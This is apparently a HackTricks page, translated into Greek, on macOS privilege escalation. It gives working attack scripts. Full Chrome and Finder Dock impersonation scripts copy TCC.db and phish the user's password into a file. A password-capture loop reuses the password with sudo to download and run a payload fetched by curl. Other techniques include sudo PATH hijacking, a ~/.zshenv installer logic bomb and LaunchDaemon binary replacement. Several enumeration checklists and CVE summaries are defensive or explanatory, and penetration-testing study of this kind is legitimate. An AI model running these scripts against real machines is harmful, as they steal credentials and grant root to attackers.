# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Αν αναζητάς το TCC privilege escalation, πήγαινε εδώ:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Πολλές τεχνικές privilege escalation που επηρεάζουν το Linux ή άλλα Unix-like συστήματα εφαρμόζονται επίσης στο macOS. Δες:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Μπορείς να βρεις την αρχική [τεχνική Sudo Hijacking μέσα στην ανάρτηση Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί το **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν το **hijack άλλων binaries** που το θύμα θα εκτελέσει επίσης όταν **εκτελεί το sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το terminal είναι πολύ πιθανό να έχει **εγκατεστημένο το Homebrew**. Επομένως, είναι πιθανό να γίνει hijack binaries στο **`/opt/homebrew/bin`**.

### Impersonation του Dock

Χρησιμοποιώντας κάποιο **social engineering**, θα μπορούσατε να **impersonate, για παράδειγμα, το Google Chrome** μέσα στο Dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Μερικές προτάσεις:

- Ελέγξτε στο Dock αν υπάρχει το Chrome και, σε αυτήν την περίπτωση, **αφαιρέστε** αυτήν την καταχώριση και **προσθέστε** την **fake** καταχώριση του **Chrome στην ίδια θέση** στον πίνακα του Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Μερικές προτάσεις:

- **Δεν μπορείς να αφαιρέσεις το Finder από το Dock**, οπότε, αν πρόκειται να το προσθέσεις στο Dock, μπορείς να τοποθετήσεις το fake Finder ακριβώς δίπλα στο πραγματικό. Για αυτό χρειάζεται να **προσθέσεις την καταχώριση του fake Finder στην αρχή του array του Dock**.
- Μια άλλη επιλογή είναι να μην το τοποθετήσεις στο Dock και απλώς να το ανοίξεις· το «Finder asking to control Finder» δεν είναι και τόσο παράξενο.
- Μια άλλη επιλογή για **escalate σε root χωρίς να ζητηθεί** το password με ένα τρομακτικό παράθυρο, είναι να κάνεις το Finder να ζητήσει πραγματικά το password για την εκτέλεση μιας privileged ενέργειας:
- Ζήτησε από το Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (το prompt που ζητά το password θα αναφέρει ότι «το Finder θέλει να αντιγράψει το sudo»).
- Ζήτησε από το Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείς να ελέγξεις το όνομα του αρχείου, ώστε το prompt που ζητά το password να αναφέρει ότι «το Finder θέλει να αντιγράψει το Finder.bundle»).

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing μέσω prompt κωδικού πρόσβασης + επαναχρησιμοποίηση sudo

Το Malware συχνά εκμεταλλεύεται την αλληλεπίδραση του χρήστη για να **καταγράψει έναν κωδικό πρόσβασης με δυνατότητα sudo** και να τον επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:

1. Εντοπισμός του συνδεδεμένου χρήστη με `whoami`.
2. **Επανάληψη των prompt κωδικού πρόσβασης** μέχρι η εντολή `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
3. Προσωρινή αποθήκευση του credential (π.χ. `/tmp/.pass`) και εκτέλεση privileged ενεργειών με `sudo -S` (κωδικός πρόσβασης μέσω stdin).

Ελάχιστη αλυσίδα παραδείγματος:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ο κλεμμένος κωδικός πρόσβασης μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για **την εκκαθάριση του Gatekeeper quarantine με `xattr -c`**, την αντιγραφή LaunchDaemons ή άλλων προνομιούχων αρχείων και την εκτέλεση πρόσθετων σταδίων χωρίς αλληλεπίδραση.<sup>[[1]](#references)</sup>

## Νεότερα vectors ειδικά για macOS (2023–2026)

### Το deprecated `AuthorizationExecuteWithPrivileges` εξακολουθεί να είναι usable

Το `AuthorizationExecuteWithPrivileges` έγινε deprecated στην έκδοση 10.7, αλλά **εξακολουθεί να λειτουργεί στα Sonoma/Sequoia**. Πολλά commercial updaters καλούν το `/usr/libexec/security_authtrampoline` με ένα μη αξιόπιστο path. Αν το binary-στόχος είναι εγγράψιμο από τον χρήστη, μπορείς να τοποθετήσεις ένα trojan και να εκμεταλλευτείς το νόμιμο prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Συνδύασέ το με τα **masquerading tricks παραπάνω** για να παρουσιάσεις έναν πειστικό διάλογο εισαγωγής κωδικού πρόσβασης.


### Triage προνομιούχου helper / XPC

Πολλά σύγχρονα third-party macOS privescs ακολουθούν το ίδιο μοτίβο: ένα **root LaunchDaemon** εκθέτει μια υπηρεσία **Mach/XPC** από το **`/Library/PrivilegedHelperTools`** και, στη συνέχεια, ο helper είτε **δεν επικυρώνει τον client**, είτε τον επικυρώνει **πολύ αργά** (PID race), είτε εκθέτει μια **root method** που καταναλώνει ένα **user-controlled path/script**. Αυτή είναι η κατηγορία bug πίσω από πολλά πρόσφατα προβλήματα σε helpers σε VPN clients, game launchers και updaters.<sup>[[2]](#references)</sup>

Γρήγορο checklist triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Δώστε ιδιαίτερη προσοχή σε helpers που:

- συνεχίζουν να αποδέχονται requests **μετά το uninstall**, επειδή το job παρέμεινε φορτωμένο στο `launchd`
- εκτελούν scripts ή διαβάζουν configuration από το **`/Applications/...`** ή από άλλα paths εγγράψιμα από non-root users
- βασίζονται σε validation peer με βάση το **PID** ή μόνο το **bundle-id**, το οποίο μπορεί να είναι ευάλωτο σε race condition

Για περισσότερες λεπτομέρειες σχετικά με authorization bugs σε helpers, ελέγξτε [αυτή τη σελίδα](macos-proces-abuse/macos-ipc/inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Κληρονόμηση environment από scripts του PackageKit (CVE-2024-27822)

Μέχρι η Apple να το διορθώσει στα **Sonoma 14.5**, **Ventura 13.6.7** και **Monterey 12.7.5**, οι εγκαταστάσεις που ξεκινούσε ο user μέσω των **`Installer.app`** / **`PackageKit.framework`** μπορούσαν να εκτελούν **PKG scripts ως root μέσα στο environment του τρέχοντος user**. Αυτό σημαίνει ότι ένα package που χρησιμοποιεί **`#!/bin/zsh`** θα φόρτωνε το **`~/.zshenv`** του attacker και θα το εκτελούσε ως **root** όταν το θύμα εγκαθιστούσε το package.<sup>[[3]](#references)</sup>

Αυτό είναι ιδιαίτερα ενδιαφέρον ως **logic bomb**: χρειάζεστε μόνο ένα foothold στον λογαριασμό του user και ένα εγγράψιμο shell startup file, και στη συνέχεια περιμένετε να εκτελεστεί από τον user οποιοδήποτε ευάλωτο **zsh-based** installer. Αυτό γενικά **δεν** ισχύει για deployments μέσω **MDM/Munki**, επειδή αυτά εκτελούνται μέσα στο environment του root user.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Εάν θέλετε μια βαθύτερη ανάλυση της κατάχρησης που αφορά συγκεκριμένα installers, ελέγξτε επίσης [αυτή τη σελίδα](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Σύγκρουση προορισμού Installer μέσω του `.localized`

Ορισμένοι third-party installers καταχωρίζουν ένα root LaunchDaemon, του οποίου το executable αναφέρεται με fixed path μέσα στο `/Applications/Target.app`. Εάν ένας attacker μπορεί να δημιουργήσει πρώτος αυτό το bundle με **διαφορετικό bundle identifier**, ο Installer ενδέχεται να διατηρήσει το decoy και να τοποθετήσει την πραγματική εφαρμογή στο `/Applications/Target.localized/Target.app`. Το daemon εξακολουθεί να δείχνει στο αρχικό path. Επομένως, ένα executable υπό τον έλεγχο του attacker μέσα στο decoy bundle μπορεί αργότερα να εκτελεστεί ως root.<sup>[[8]](#references)</sup>

Οι σημαντικές προϋποθέσεις είναι οι εξής:<sup>[[8]](#references)</sup>

1. Ο attacker μπορεί να δημιουργήσει ή να ελέγξει το αναμενόμενο application path.
2. Το package δεν αφαιρεί το conflicting bundle.
3. Το privileged job χρησιμοποιεί hard-coded path μέσα σε αυτό το bundle.
4. Ο χρήστης ή ένα MDM workflow εγκαθιστά το package και καταχωρίζει το job.

Αναζητήστε relocated bundles και, στη συνέχεια, ελέγξτε τα LaunchDaemon targets με το enumeration loop στην επόμενη ενότητα:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Ένας ασφαλέστερος installer επιλύει την τελική τοποθεσία του bundle και διατηρεί τα privileged executables σε τοποθεσία που ανήκει στον root, όπως `/Library/PrivilegedHelperTools`. Θα πρέπει επίσης να επαληθεύει την ιδιοκτησία και το code signing πριν από την καταχώριση ή την εκκίνηση του job.<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

Ένα LaunchDaemon plist μπορεί να ανήκει στον root, ενώ το `Program` ή η πρώτη καταχώριση του `ProgramArguments` να δείχνει σε directory εγγράψιμο από τον χρήστη. Ελέγξτε **ολόκληρο το path**, όχι μόνο τα permissions του executable. Αν το parent directory είναι εγγράψιμο, ένας attacker μπορεί να μετονομάσει ένα root-owned executable και να δημιουργήσει ένα replacement στο ίδιο path. Το replacement εκτελείται ως root την επόμενη φορά που ξεκινά το job. Αρκεί ένα reboot ή ένα κανονικό service restart. Ο attacker δεν χρειάζεται permission για να εκτελέσει το `launchctl bootstrap` στο system domain.<sup>[[7]](#references)</sup>

Απαριθμήστε πρώτα κάθε target και το άμεσο parent του:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Όταν το αρχείο ή ο γονικός του κατάλογος είναι εγγράψιμος, διατήρησε το αρχικό binary και αντικατάστησε το path με ένα executable payload. Στη συνέχεια, περίμενε να γίνει επανεκκίνηση του ήδη φορτωμένου daemon.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Η ευάλωτη διαδρομή `kauth_cred_proc_update` ενημέρωνε το `proc_ro.p_ucred` με το non-atomic API `zalloc_ro_mut`, ενώ οι SMR readers φόρτωναν τον pointer χωρίς lock. Το public trigger χρησιμοποιεί ένα ειδικά προετοιμασμένο setgid binary. Ένα thread εναλλάσσεται μεταξύ των real και effective group IDs του, ενώ ένα άλλο thread εισέρχεται επανειλημμένα σε ένα syscall όπως το `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Αντιμετωπίστε το ως **race primitive**, όχι ως έτοιμο root exploit. Το δημοσιευμένο PoC επιδεικνύει έναν torn credential pointer. Συνήθως καταλήγει σε kernel panic. Ο ερευνητής αναπαρήγαγε την αλλοίωση μόνο σε Intel και δεν παρείχε deterministic έλεγχο του credential object που προκύπτει. Η Apple άλλαξε την ενημέρωση σε atomic pointer exchange στο macOS 15.3.<sup>[[4]](#references)</sup>

### SIP bypass μέσω του Migration assistant ("Migraine", CVE-2023-32369)

Αν έχετε ήδη root, το SIP εξακολουθεί να εμποδίζει τις εγγραφές σε system locations. Το bug **Migraine** εκμεταλλεύεται το entitlement του Migration Assistant `com.apple.rootless.install.heritable` για να εκκινήσει child process που κληρονομεί SIP bypass και αντικαθιστά protected paths (π.χ. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Η αλυσίδα:

1. Αποκτήστε root σε ένα ενεργό σύστημα.
2. Ενεργοποιήστε το `systemmigrationd` με crafted state ώστε να εκτελέσει ένα attacker-controlled binary.
3. Χρησιμοποιήστε το inherited entitlement για να τροποποιήσετε SIP-protected files, διατηρώντας την persistence ακόμη και μετά από reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Πολλαπλά Apple daemons αποδέχονται αντικείμενα **NSPredicate** μέσω XPC και επικυρώνουν μόνο το πεδίο `expressionType`, το οποίο ελέγχεται από τον attacker. Κατασκευάζοντας ένα predicate που αξιολογεί arbitrary selectors, μπορείτε να επιτύχετε **code execution σε root/system XPC services** (π.χ. `coreduetd`, `contextstored`). Σε συνδυασμό με ένα αρχικό app sandbox escape, αυτό παρέχει **privilege escalation χωρίς user prompts**. Αναζητήστε XPC endpoints που κάνουν deserialize predicates και δεν διαθέτουν robust visitor.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation

**Οποιοσδήποτε user** (ακόμη και unprivileged users) μπορεί να δημιουργήσει και να κάνει mount ένα Time Machine snapshot με `-o noowners` και να **αποκτήσει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του snapshot, παρακάμπτοντας τους ownership checks στο live volume. Το μόνο privilege που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να διαθέτει **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Οι εντολές και η πλήρης εξήγηση βρίσκονται στη σελίδα TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

Αυτό μπορεί να είναι χρήσιμο για privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Local Privilege Escalation του AWS Client VPN για macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege Escalation του macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Μια νέα bug class για Privilege Escalation σε macOS και iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: privilege escalation και persistence μέσω insecure folder permissions](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE μέσω του .localized directory](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
